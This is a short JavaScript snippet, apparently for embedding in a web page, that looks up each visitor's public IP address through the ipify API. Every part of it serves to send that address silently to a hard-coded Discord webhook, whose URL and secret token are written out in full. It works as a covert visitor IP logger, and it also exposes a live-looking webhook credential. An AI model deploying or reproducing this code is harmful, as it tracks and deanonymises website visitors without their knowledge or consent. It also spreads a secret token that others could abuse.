// get the IP address using ipify API
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    // set up the request to Discord webhook
    const webhookUrl = 'https://discord.com/api/webhooks/1078279495343161344/eKgaAGw4VMdt8VM0Rcex3hxJgKtzC29KT8PSc1YbrWfnNRnUsBd6unyoIgTt0qKrDUzo';
    const options = {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `Visitor's IP address is ${ip}` })
    };

    // send the request
    fetch(webhookUrl, options)
      .then(response => {
        if (response.ok) {
          console.log(`IP address ${ip} has been sent to the Discord webhook.`);
        } else {
          console.error(`Failed to send the IP address to the Discord webhook.`);
        }
      })
      .catch(error => {
        console.error(`An error occurred while trying to send the IP address to the Discord webhook: ${error}`);
      });
  })
  .catch(error => {
    console.error(`Failed to get the IP address using ipify API: ${error}`);
  });
